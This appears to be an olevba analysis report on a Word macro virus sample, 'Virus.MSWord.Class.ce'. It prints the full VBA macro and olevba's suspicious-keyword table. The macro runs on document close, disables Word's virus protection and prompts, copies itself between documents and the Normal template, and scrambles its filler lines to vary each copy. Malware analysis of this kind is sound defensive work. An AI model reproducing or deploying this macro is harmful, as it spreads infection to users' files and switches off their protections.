olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
UL34 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UIL = QBN + KGN
Application.EnableCancelKey = 0
OFG = SSM + VUE
Options.ConfirmConversions = 0
PVF = LCV + OAM
Options.SaveNormalPrompt = 0
CCR = GBG + IGU
AL76 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
VIG = DDO + JJP
Options.VirusProtection = 0
HNE = EMB + KTF
If UL34 > 0 And AL76 > 0 Then GoTo UQ48
RIG = UNN + JCM
If UL34 = 0 Then
PUS = ALU + JOL
Set NF96 = ActiveDocument.VBProject.VBComponents.Item(1)
LKH = IFB + FVB
RK90 = True
IIK = DKF + NLD
End If
UOL = ICR + KQN
If AL76 = 0 Then
SAE = BCH + CAL
Set NF96 = NormalTemplate.VBProject.VBComponents.Item(1)
OLS = BEO + JHD
TF46 = True
PUL = BQI + KKE
End If
HCM = DUC + JGT
If TF46 <> True And RK90 <> True Then GoTo UQ48
QGO = FBA + HRG
If TF46 = True Then NF96.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UL34 - 1))
FKF = HAK + ETM
If RK90 = True Then NF96.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AL76 - 1))
QUH = LBN + JVC
With NF96.CodeModule
UNH = DKE + VCA
For x = 2 To (NF96.CodeModule.CountOfLines - 1) Step 2
HMU = LIS + SOP
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
VHK = JPD + JLR
Next x
LJL = FNK + OTI
End With
GGD = LEM + HTK
UQ48:
EPQ = NRD + REV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

